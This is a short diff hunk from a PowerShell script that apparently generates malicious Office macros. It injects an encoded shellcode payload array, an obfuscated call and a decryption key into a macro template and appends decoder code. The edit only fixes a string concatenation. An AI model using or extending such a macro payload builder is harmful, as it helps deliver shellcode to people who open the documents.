@@ -168,7 +168,7 @@ function Create_MacroFromTemplate($Shift, $Decoder, $DecoderPath, $ShellCode, $T
             Set-Content -Path $MacroOutput -Value (
                 Get-Content -Path $Template).Replace(
                 "PAYLOAD", "Array(" + $PayloadArray + ')' + 
-                "`r`n" + "`r`n" + "`t" + "kUG HoR, " + '"' + $Key '"')
+                "`r`n" + "`r`n" + "`t" + "kUG HoR, " + '"' + $Key + '"')
             Add-Content -Path $MacroOutput -Value (Get-Content -Path $DecoderPath)
         }
         Default {
